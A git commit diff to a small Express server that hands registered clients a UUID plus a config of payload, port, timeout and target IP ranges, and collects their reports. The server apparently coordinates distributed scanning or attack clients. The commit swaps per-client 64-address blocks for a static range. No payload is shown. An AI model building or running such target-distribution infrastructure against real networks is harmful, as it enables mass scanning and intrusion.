e672392acbfdaa9f053339fbff263992795b1bc9
Matthew Coal <matemate001@gmail.com>
2021-02-01 15:38:22 +0100

    feat: custom ip ranges

--- index.js
+++ index.js
@@ -1,10 +1,9 @@
 const express = require('express');
 const { v4 } = require('uuid');
-const storage = require('./storage');
 
 const app = express();
 const config = {
-  Enabled: false, Payload: "", Port: 0, Timeout: 1000,
+  Enabled: false, Payload: "", IPs: [{Start:[127,0,0,1],End:[127,0,0,1]}], Port: 0, Timeout: 1000,
 };
 const reports = {};
 
@@ -28,39 +27,16 @@ app.post('/update/:uuid', (req, res) => {
   reports[req.params.uuid] = req.body;
   res.json(Object.assign({
     UUID: req.params.uuid,
-    IPs: storage.getValue(req.params.uuid),
   }, config));
-});
-
-app.get('/renew/:uuid/:ip', async (req, res) => {
-  const orig = storage.getValue(req.params.uuid);
-  const indx = orig.indexOf(req.params.ip);
-  if (indx === -1) {
-    return res.sendStatus(400);
-  }
-  orig.splice(indx, 1);
-  const newip = storage.getNextIp();
-  orig.push(newip);
-  await storage.setValue(req.params.uuid, orig);
-  return res.send(newip);
 });
 
 app.post('/register', async (_, res) => {
   const newUUID = v4();
-  const newTargets = [];
-  for (let i = 0; i < 64; i++) {
-    newTargets.push(storage.getNextIp());
-  }
-  await storage.setValue(newUUID, newTargets);
-  console.log('register: assigned', newTargets[0], '-', newTargets[newTargets.length-1], 'to', newUUID);
   res.json(Object.assign({
     UUID: newUUID,
-    IPs: newTargets,
   }, config));
 });
 
-storage.init().then(() => {
-  app.listen(process.env.NODE_PORT || 80, () => {
-    console.log('init: done');
-  });
+app.listen(process.env.NODE_PORT || 80, () => {
+  console.log('init: done');
 });
